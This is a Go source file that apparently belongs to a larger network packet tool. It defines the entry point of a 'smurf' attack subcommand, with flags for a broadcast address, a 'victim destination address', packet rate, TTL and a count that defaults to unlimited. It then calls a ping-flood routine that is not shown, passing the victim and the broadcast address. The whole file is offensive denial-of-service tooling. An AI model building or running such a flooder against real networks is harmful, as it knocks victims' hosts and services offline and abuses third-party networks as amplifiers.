package module

import (
	"os"
	"log"

	_"cjr/protocol"
	flags "github.com/jessevdk/go-flags"
)

func smurfEntry(remainFlags []string) {
	var opts struct {
		Broadcast  string `short:"b" long:"broadcast" description:"broadcast address" value-name:"address" required:"true"`
		Dest string `short:"d" long:"destination" description:"victim destination address" value-name:"address" required:"true"`
		Count int `short:"c" long:"count" description:"stop after sending count packets" value-name:"count" default:"0"`
		Rate string `short:"r" long:"rate" description:"send packets as a specific rate, such as 100/ms, 2/s, 100/min, the default is \"nolimit\"" value-name:"<speed>" default:"nolimit"`
		TTL uint `short:"t" long:"ttl" description:"set TTL of IP packet" value-name:"ttl" default:"64"`
	}

	cmd := flags.NewParser(&opts, flags.HelpFlag | flags.PrintErrors)

	_, err := cmd.ParseArgs(remainFlags)
	if err != nil {
		log.Fatal(err)
	}

	if len(remainFlags) == 0 {
		cmd.WriteHelp(os.Stderr)
	}
	for _, flag := range remainFlags {
		if flag == "help" {
			cmd.WriteHelp(os.Stderr)
			return
		}
	}
	if opts.Count <= 0 {
		opts.Count = int(^uint(0) >> 1)
	}

	pingFloodStart(opts.Dest, opts.Broadcast, uint(opts.Count), opts.Rate, opts.TTL, true)
}
